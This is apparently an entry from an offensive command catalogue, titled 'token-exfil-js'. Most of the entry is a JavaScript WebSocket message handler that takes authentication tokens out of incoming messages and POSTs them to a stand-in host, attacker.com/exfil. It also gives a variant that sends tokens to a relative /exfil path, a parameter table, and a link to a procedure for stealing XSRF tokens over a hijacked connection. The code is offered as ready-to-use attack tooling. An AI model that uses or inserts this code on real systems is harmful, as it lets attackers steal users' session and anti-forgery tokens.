---
id: 123e4567-e89b-12d3-a456-426614174006
name: token-exfil-js
type: command
executor: javascript
data: >-
  ws.onmessage = function(event) { const data = JSON.parse(event.data); if
  (data.token) { console.log('Token found:', data.token);
  fetch('https://attacker.com/exfil', { method: 'POST', body:
  JSON.stringify({token: data.token}) }); } };
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:35.945Z'
platforms:
  - Web
tags:
  - exfiltration
  - token
  - websocket
verified: false
validated: true
submitted: true
---

# token-exfil-js

## Command

```javascript
ws.onmessage = function(event) {
  const data = JSON.parse(event.data);
  if (data.token) {
    console.log('Token found:', data.token);
    fetch('https://attacker.com/exfil', {
      method: 'POST',
      body: JSON.stringify({token: data.token})
    });
  }
};
```

## Description

This JavaScript command parses WebSocket messages for tokens and exfiltrates them via POST to an attacker server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `ws.onmessage` | Event handler for messages | Yes |
| `JSON.parse` | Parse message body | Yes |
| `data.token` | Field containing the token | No |
| `https://attacker.com/exfil` | Exfil endpoint | Yes |

## Examples

### Basic Usage

```javascript
ws.onmessage = function(event) {
  const data = JSON.parse(event.data);
  if (data.token) console.log(data.token);
};
```

### Advanced Usage

```javascript
ws.onmessage = function(event) {
  const data = JSON.parse(event.data);
  if (data.token) {
    fetch('/exfil?token=' + encodeURIComponent(data.token));
  }
};
```

## Expected Output

Console: 'Token found: [value]' and network request to exfil endpoint.

## Related

- [[Related Procedure: Steal-XSRF-TOKEN-via-Hijacked-Connection]]
